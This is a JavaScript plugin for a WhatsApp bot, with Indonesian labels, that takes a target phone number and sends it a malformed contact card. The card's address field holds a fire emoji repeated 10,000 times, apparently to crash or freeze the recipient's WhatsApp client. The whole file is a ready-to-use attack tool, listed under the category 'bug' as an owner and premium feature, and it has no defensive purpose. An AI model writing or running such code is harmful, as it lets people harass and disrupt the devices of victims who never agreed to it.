const config = require('../../config')

const pluginConfig = {
    name: 'bugvcard',
    alias: ['vbug'],
    category: 'bug',
    description: 'Mengirimkan kontak korup.',
    usage: '.bugvcard 628xxx',
    example: '.bugvcard 62812345678',
    isOwner: true,
    isPremium: true,
    isGroup: false,
    isPrivate: false,
    cooldown: 10,
    energi: 15,
    isEnabled: true
}

async function handler(m, { sock, text }) {
    if (!text) return m.reply('Mana nomor targetnya?')
    const target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

    try {
        const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 
                      `FN:VoidZero-Tio\n` + 
                      `ORG:VoidZero-Bug;\n` + 
                      `TEL;type=CELL;type=VOICE;waid=19999999999:+1 999 999 999\n` +
                      `item1.ADR:;;${"🔥".repeat(10000)};;;;\n` +
                      'END:VCARD'

        await sock.sendMessage(target, {
            contacts: {
                displayName: 'Void Zero Bug',
                contacts: [{ vcard }]
            }
        })
        await m.reply('📍 *VCARD BUG SENT*')
    } catch (error) {
        await m.reply(`❌ *GAGAL*\n\n> ${error.message}`)
    }
}

module.exports = {
    config: pluginConfig,
    handler
}